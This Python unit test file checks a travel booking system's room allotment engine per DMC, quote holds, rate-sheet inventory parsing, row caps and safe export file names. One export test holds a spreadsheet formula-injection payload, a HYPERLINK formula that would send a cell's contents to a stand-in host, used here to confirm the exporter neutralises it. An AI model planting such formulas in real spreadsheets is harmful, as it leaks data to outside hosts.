"""AA-1153 part 2 without a database: the allotment engine per DMC (supplier scoping, units taken by earlier asks and
held B2B room lines), the B2B room line answer and its note, the hold's re-check, the Inventory sheet rules, the
policy row cap of a rate sheet, the export file name, and the B2B desk's DMC label. The HTTP flow (quote, hold,
desk, export -> import) runs on PostgreSQL in ``tests/integration/test_aa1153_allotment.py``. Names are invented."""

from __future__ import annotations

from datetime import UTC, date, datetime
from typing import Any

import pytest

from app.b2b import desk, room_hold
from app.errors import Invalid
from app.supply import availability, rate_sheet, rate_sheet_export, rate_sheet_inventory, restrictions
from app.supply.rate_sheet_cells import Budget
from app.supply.restrictions import SupplyAsk, Verdict
from tests.unit.fakes import ScriptedConn

ROOM = "00000000-0000-4000-8000-0000000a1153"
DMC_A, DMC_B = "00000000-0000-4000-8000-00000000d0ca", "00000000-0000-4000-8000-00000000d0cb"
NIGHT = date(2027, 3, 10)
TODAY = date(2027, 2, 1)
PUBLISHED, REPUBLISHED = datetime(2027, 1, 5, 9, tzinfo=UTC), datetime(2027, 1, 20, 9, tzinfo=UTC)


def _row(rid: str, supplier: str, kind: str = "allotment", **kw: Any) -> dict[str, Any]:
    return {
        "id": rid, "room_type_id": ROOM, "service_id": None, "supplier_id": supplier, "kind": kind,
        "date_from": date(2027, 3, 1), "date_to": date(2027, 3, 31), "units": kw.get("units"),
        "release_days": kw.get("release_days"), "max_pax": kw.get("max_pax"), "status": "contract", "ended": False,
        "contract_id": kw.get("contract", "k-1"), "published_at": kw.get("published_at", PUBLISHED),
    }  # fmt: skip


def _conn(rows: list[dict[str, Any]], booked: int = 0, held: int = 0) -> ScriptedConn:
    conn = ScriptedConn()
    conn.on("FROM booking.supply_restrictions r", rows)
    conn.on("FROM booking.supplier_bookings b CROSS JOIN", [{"id": ROOM, "supplier_id": DMC_B, "day": NIGHT,
                                                             "used": booked}] if booked else [])  # fmt: skip
    conn.on("WITH held AS", [{"id": ROOM, "supplier_id": DMC_B, "day": NIGHT, "used": held}] if held else [])
    return conn


def _ask(units: int, supplier: str | None = DMC_B, on: date = NIGHT) -> SupplyAsk:
    return SupplyAsk(ROOM, None, on, 2 * units, units, supplier)


# ── Engine per DMC ───────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_two_rooms_fit_a_third_is_on_request_and_asks_share_the_allotment() -> None:
    conn = _conn([_row("a", DMC_B, units=2, release_days=7)])
    [two] = await availability.many(conn, [_ask(2)], today=TODAY)
    assert (two.status, two.reason) == ("available", "allotment")
    [three] = await availability.many(conn, [_ask(3)], today=TODAY)
    assert (three.status, three.reason) == ("on_request", "allotment_full")
    first, second = await availability.many(conn, [_ask(2), _ask(1)], today=TODAY)  # one quote, two lines
    assert (first.reason, second.reason) == ("allotment", "allotment_full")


@pytest.mark.asyncio
async def test_a_line_answered_on_request_takes_no_room_from_the_next_line() -> None:
    """S291: line 1 asks 2 rooms on the 10th (fits) and 3 on the 11th (full): the line is on request and held on
    request, so it takes nothing; line 2 (1 room on the 10th) still gets one of the 2 rooms. Before, the 10th of line 1
    counted as taken and line 2 read allotment_full (a conservative miscount inside one pass)."""
    conn = _conn([_row("a", DMC_B, units=2, release_days=7)])
    asks = [_ask(2), _ask(3, on=date(2027, 3, 11)), _ask(1)]
    first_night, second_night, other = await availability.many(conn, asks, today=TODAY, groups=[1, 1, 2])
    assert (first_night.reason, second_night.reason, other.reason) == ("allotment", "allotment_full", "allotment")
    # Without groups every ask is its own group (the staff check): the 10th of line 1 is taken as before.
    *_, ungrouped = await availability.many(conn, asks, today=TODAY)
    assert ungrouped.reason == "allotment_full"
    # A whole line available still takes its rooms for the next line; inside one line its own units count at once.
    a, b = await availability.many(conn, [_ask(2), _ask(1)], today=TODAY, groups=[1, 2])
    assert (a.reason, b.reason) == ("allotment", "allotment_full")
    a, b = await availability.many(conn, [_ask(1), _ask(2)], today=TODAY, groups=[1, 1])
    assert (a.reason, b.reason) == ("allotment", "allotment_full")


@pytest.mark.asyncio
async def test_booked_and_held_rooms_count_and_the_own_hold_is_left_out() -> None:
    conn = _conn([_row("a", DMC_B, units=2, release_days=7)], booked=1, held=1)
    [verdict] = await availability.many(conn, [_ask(1)], today=TODAY, exclude_hold="h-own")
    assert verdict.reason == "allotment_full"
    [held_args] = conn.sql("WITH held AS")
    assert held_args[-1] == "h-own"  # the quote's own proposal-version hold is not counted
    # The supplier booking of a B2B line held from the allotment is counted by the line (its real room count) only.
    flat = " ".join(availability.USED_ROOMS_SQL.split())
    assert "AND NOT EXISTS (SELECT 1 FROM booking.trip_case_version_itinerary" in flat
    assert "l.held_as = 'available' AND l.status = 'confirmed'" in flat


@pytest.mark.asyncio
async def test_another_dmcs_allotment_never_answers_for_this_dmc() -> None:
    conn = _conn([_row("a", DMC_A, units=5, release_days=0)])
    [b] = await availability.many(conn, [_ask(1, DMC_B)], today=TODAY)
    assert (b.status, b.reason) == ("on_request", "no_terms")
    [any_dmc] = await availability.many(conn, [_ask(1, None)], today=TODAY)  # the staff check without a DMC
    assert any_dmc.reason == "allotment"


@pytest.mark.asyncio
async def test_a_reimported_contract_replaces_the_terms_it_copies_never_doubles_them() -> None:
    # Export, edit, import back, publish: two published contracts of DMC B with the same allotment of 2 rooms.
    old = _row("a", DMC_B, units=2, release_days=7, contract="k-1", published_at=PUBLISHED)
    new = _row("b", DMC_B, units=2, release_days=7, contract="k-2", published_at=REPUBLISHED)
    conn = _conn([old, new])
    two, three = await availability.many(conn, [_ask(2), _ask(3)], today=TODAY)
    assert (two.status, two.restriction_id) == ("available", "b")  # the newest contract's term answers
    assert (three.status, three.reason) == ("on_request", "allotment_full")  # 2 rooms, not 2 + 2
    # The new contract closes the allotment with an on-request term: the older allotment no longer answers.
    closed = _row("c", DMC_B, "on_request", contract="k-2", published_at=REPUBLISHED)
    [ask] = await availability.many(_conn([old, closed]), [_ask(1)], today=TODAY)
    assert (ask.status, ask.reason) == ("on_request", "on_request")
    # Another DMC's contract is its own: the staff check without a DMC still adds both DMCs' allotments.
    other = _row("d", DMC_A, units=3, release_days=0, contract="k-9", published_at=PUBLISHED)
    [five] = await availability.many(_conn([old, new, other]), [_ask(5, None)], today=TODAY)
    [six] = await availability.many(_conn([old, new, other]), [_ask(6, None)], today=TODAY)
    assert (five.reason, six.reason) == ("allotment", "allotment_full")


def test_a_stop_sale_on_the_older_contract_still_counts() -> None:
    stop = restrictions.Restriction("s", "stop_sale", date(2027, 3, 1), date(2027, 3, 31), "approved",
                                    supplier_id=DMC_B, contract_id="k-1", published_at=PUBLISHED)  # fmt: skip
    term = restrictions.Restriction("b", "allotment", date(2027, 3, 1), date(2027, 3, 31), "contract", units=2,
                                    supplier_id=DMC_B, contract_id="k-2", published_at=REPUBLISHED)  # fmt: skip
    verdict = restrictions.evaluate([stop, term], NIGHT, pax=2, today=TODAY)
    assert (verdict.status, verdict.reason) == ("on_request", "stop_sale")


@pytest.mark.asyncio
async def test_release_days_put_the_night_back_with_the_dmc() -> None:
    conn = _conn([_row("a", DMC_B, units=2, release_days=7)])
    [open_] = await availability.many(conn, [_ask(1)], today=date(2027, 3, 3))  # 10/3 - 7 = 3/3: still open
    [gone] = await availability.many(conn, [_ask(1)], today=date(2027, 3, 4))
    assert (open_.reason, gone.reason) == ("allotment", "released")


@pytest.mark.asyncio
async def test_staff_check_refuses_a_supplier_that_is_not_a_uuid() -> None:
    with pytest.raises(Invalid) as err:
        await availability.check(conn=_conn([]), component_id=f"rt:{ROOM}", date_from=NIGHT, date_to=NIGHT, pax=2,
                                 units=1, today=TODAY, supplier_id="SUP-000017")  # fmt: skip
    assert err.value.code == "unknown_supplier"


# ── Quote line answer ────────────────────────────────────────────────────────


def test_room_line_is_available_only_when_every_night_is() -> None:
    allot, free = Verdict("available", "allotment", "a"), Verdict("available", "free_sale", "f")
    full, released = Verdict("on_request", "allotment_full"), Verdict("on_request", "released")
    days = [date(2027, 3, 10), date(2027, 3, 11)]
    rt = f"rt:{ROOM}"
    assert availability.line_availability("on_request", rt, [allot, allot], days) == (
        "available", {"inventory": "allotment"},
    )  # fmt: skip
    assert availability.line_availability("on_request", rt, [allot, free], days)[1] == {"inventory": "mixed"}
    assert availability.line_availability("on_request", rt, [allot, full], days) == (
        "on_request", {"allotment_full": ["2027-03-11"]},
    )  # fmt: skip
    assert availability.line_availability("on_request", rt, [released, full], days)[1] == {
        "released": ["2027-03-10"], "allotment_full": ["2027-03-11"],
    }  # fmt: skip
    no_terms = Verdict("on_request", "no_terms")
    assert availability.line_availability("on_request", rt, [no_terms], days[:1]) == ("on_request", None)
    # Other lines keep the AA-1145 rule: no lift without a departure, a stop-sale puts an available line on request.
    sv = f"sv:{ROOM}"
    assert availability.line_availability("on_request", sv, [allot], days[:1]) == ("on_request", None)


def test_a_long_stay_lists_at_most_ten_dates_per_reason() -> None:
    days = [date(2027, 3, 1 + i) for i in range(20)]
    _, note = availability.room_line("on_request", [Verdict("on_request", "allotment_full")] * 20, days)
    assert note is not None and len(note["allotment_full"]) == availability.MAX_NOTE_DATES


# ── Hold ─────────────────────────────────────────────────────────────────────


def _lines() -> list[dict[str, Any]]:
    return [
        {"line_no": 1, "component_id": f"rt:{ROOM}", "availability": "available"},
        {"line_no": 2, "component_id": f"rt:{ROOM}", "availability": "on_request"},
        {"line_no": 3, "component_id": "tp:00000000-0000-4000-8000-0000000000aa", "availability": "on_request"},
    ]


@pytest.mark.asyncio
async def test_hold_rechecks_only_room_lines_the_quote_answered_available() -> None:
    result = [("on_request", None, None), ("on_request", None, None), ("available", "dep-1", None)]
    conn = _conn([_row("a", DMC_B, units=2, release_days=7)])
    conn.on("FROM booking.b2b_quote_lines q JOIN booking.supplier_rates x", [{
        "line_no": 1, "room_type_id": ROOM, "service_date": NIGHT, "nights": 2, "party": 4, "rooms": 2,
        "supplier_id": DMC_B}])  # fmt: skip
    out = await room_hold.held(conn, "q-1", _lines(), result, today=TODAY)  # type: ignore[arg-type]
    assert out == [("available", None, None), ("on_request", None, None), ("on_request", "dep-1", None)]
    assert conn.sql("pg_advisory_xact_lock") == [(ROOM,)]
    # The allotment is gone by the time of the hold (another agency held the rooms): held on request.
    taken = _conn([_row("a", DMC_B, units=2, release_days=7)], held=2)
    taken.on("FROM booking.b2b_quote_lines q JOIN booking.supplier_rates x", [{
        "line_no": 1, "room_type_id": ROOM, "service_date": NIGHT, "nights": 1, "party": 4, "rooms": 2,
        "supplier_id": DMC_B}])  # fmt: skip
    out = await room_hold.held(taken, "q-1", _lines(), result, today=TODAY)  # type: ignore[arg-type]
    assert out[0] == ("on_request", None, None)


@pytest.mark.asyncio
async def test_hold_without_a_room_line_reads_nothing_more() -> None:
    conn = ScriptedConn()
    lines = [{"line_no": 1, "component_id": "tp:x", "availability": "available"}]
    out = await room_hold.held(conn, "q-1", lines, [("available", "dep", None)], today=TODAY)  # type: ignore[arg-type]
    assert out == [("available", "dep", None)] and conn.calls == []


# ── Inventory sheet, row cap, export ─────────────────────────────────────────

CONTRACT = {"Title": "Lantern 2027", "Valid from": "2027-01-01", "Valid to": "2027-12-31", "Currency": "USD"}
RATE = [("HB-LOTUS", "Deluxe", None, "2027-01-01", "2027-12-31", "BB", None, None, "50", None)]


def test_inventory_rows_are_checked_by_kind() -> None:
    rows = [
        ("HB-LOTUS", "Deluxe", None, "allotment", "2027-03-01", "2027-03-31", 2, None, None, None),  # ok, default
        ("HB-LOTUS", "Deluxe", None, "free sale", "2027-04-01", "2027-04-30", None, None, 6, None),  # ok
        (None, None, "SVC-000001", "on request", "2027-05-01", "2027-05-31", None, None, None, "Ask first"),  # ok
        ("HB-LOTUS", "Deluxe", None, "allotment", "2027-03-01", "2027-03-31", None, 7, None, None),  # no units
        ("HB-LOTUS", "Deluxe", "SVC-000001", "on request", "2027-03-01", "2027-03-31", None, None, None, None),
        ("HB-LOTUS", "Deluxe", None, "free sale", "2027-03-01", "2027-03-31", 3, None, None, None),  # units
        ("HB-LOTUS", "Deluxe", None, "stop sale", "2027-03-01", "2027-03-31", None, None, None, None),  # kind
        ("HB-LOTUS", "Deluxe", None, "allotment", "2027-03-31", "2027-03-01", 2, None, None, None),  # dates
        ("HB-LOTUS", "Deluxe", None, "allotment", "2027-03-01", "2027-03-31", 2, 400, None, None),  # release
    ]
    sheet = rate_sheet.parse(rate_sheet.build_workbook(CONTRACT, RATE, inventory_rows=rows))
    assert [(t["row"], t["kind"], t["release_days"]) for t in sheet.inventory] == [
        (2, "allotment", None), (3, "free_sale", None), (4, "on_request", None),
    ]  # fmt: skip
    assert [(p.row, p.code) for p in sheet.problems] == [
        (5, "invalid_inventory"), (6, "invalid_inventory"), (7, "invalid_inventory"), (8, "invalid_inventory"),
        (9, "invalid_inventory"), (10, "invalid_value"),
    ]  # fmt: skip


def test_inventory_rows_count_against_the_policy_row_cap() -> None:
    rows = [("HB-LOTUS", "Deluxe", None, "on request", "2027-03-01", "2027-03-31", None, None, None, None)] * 3
    data = rate_sheet.build_workbook(CONTRACT, RATE, inventory_rows=rows)
    assert len(rate_sheet.parse(data, max_rows=4).inventory) == 3
    with pytest.raises(Invalid) as err:
        rate_sheet.parse(data, max_rows=3)
    assert err.value.code == "rate_sheet_too_many_rows"
    budget = Budget(None)
    budget.take(10_000)  # no cap outside an import
    assert budget.used == 10_000


def test_inventory_preview_fills_the_policy_release_days() -> None:
    terms = [{"row": 2, "kind": "allotment", "release_days": None, "units": 2, "max_pax": None},
             {"row": 3, "kind": "allotment", "release_days": 3, "units": 1, "max_pax": None},
             {"row": 4, "kind": "free_sale", "release_days": None, "units": None, "max_pax": 6}]  # fmt: skip
    out = rate_sheet_inventory.preview(terms, release_default=7)
    assert [(t["release_days"], t["release_days_default"]) for t in out] == [(7, True), (3, False), (None, False)]


def test_template_has_the_inventory_sheet_and_labels_match_the_kinds() -> None:
    import io

    from openpyxl import load_workbook

    wb = load_workbook(io.BytesIO(rate_sheet.template()), read_only=True)
    header = next(wb[rate_sheet_inventory.SHEET].iter_rows(values_only=True))
    assert tuple(header) == rate_sheet_inventory.COLUMNS
    assert set(rate_sheet_inventory.LABELS) == set(restrictions.TERM_KINDS)
    assert all(rate_sheet_inventory.KINDS[label] == kind for kind, label in rate_sheet_inventory.LABELS.items())


def test_export_keeps_formula_like_text_as_text_and_it_imports_back_the_same() -> None:
    import io

    from openpyxl import load_workbook

    title = '=HYPERLINK("https://example.invalid/?"&B2,"open")'
    rate = [("HB-LOTUS", "Deluxe", None, "2027-01-01", "2027-12-31", "BB", None, None, "50", "=1+1")]
    inventory = [("HB-LOTUS", "Deluxe", None, "allotment", "2027-03-01", "2027-03-31", 2, 7, None, "@SUM(A1)")]
    data = rate_sheet.build_workbook({**CONTRACT, "Title": title}, rate, inventory_rows=inventory)
    wb = load_workbook(io.BytesIO(data))
    hotel, inventory_sheet = wb[rate_sheet.HOTEL_SHEET], wb[rate_sheet_inventory.SHEET]
    cells = [wb[rate_sheet.CONTRACT_SHEET]["B1"], hotel["J2"], inventory_sheet["J2"]]
    assert [(c.value, c.data_type, c.quotePrefix) for c in cells] == [
        (title, "s", True), ("=1+1", "s", True), ("@SUM(A1)", "s", True),
    ]  # fmt: skip
    assert hotel["I2"].quotePrefix is False  # a plain value is left as it is
    sheet = rate_sheet.parse(data)
    assert not sheet.problems
    assert sheet.contract["title"] == title
    assert [r.values["notes"] for r in sheet.rows] == ["=1+1"]
    assert [t["note"] for t in sheet.inventory] == ["@SUM(A1)"]


def test_export_file_name_is_a_safe_header_value() -> None:
    assert (
        rate_sheet_export.filename("SUP-000017", "2027 rates / HB & BB")
        == "aa-rate-sheet-SUP-000017-2027-rates-hb-bb.xlsx"
    )
    assert rate_sheet_export.filename('SUP"x', "") == "aa-rate-sheet-SUPx-contract.xlsx"
    assert set(rate_sheet_export.SERVICE_SHEET.values()) == set(rate_sheet.SERVICE_SHEETS)


# ── B2B desk ─────────────────────────────────────────────────────────────────


def test_desk_names_the_dmc_of_the_rate_used_else_the_component_supplier() -> None:
    label = {"supplier_id": DMC_A, "supplier": "Lotus DMC"}
    priced = {"rate_supplier_id": DMC_B, "rate_supplier": "Lantern DMC"}
    assert desk.line_supplier(priced, label) == {"id": DMC_B, "name": "Lantern DMC"}
    assert desk.line_supplier({"rate_supplier_id": None}, label) == {"id": DMC_A, "name": "Lotus DMC"}
    assert desk.line_supplier({}, {}) is None
    assert "q.component_id NOT LIKE 'tp:%'" in desk.LINE_FROM  # a tour line has many suppliers: none is named
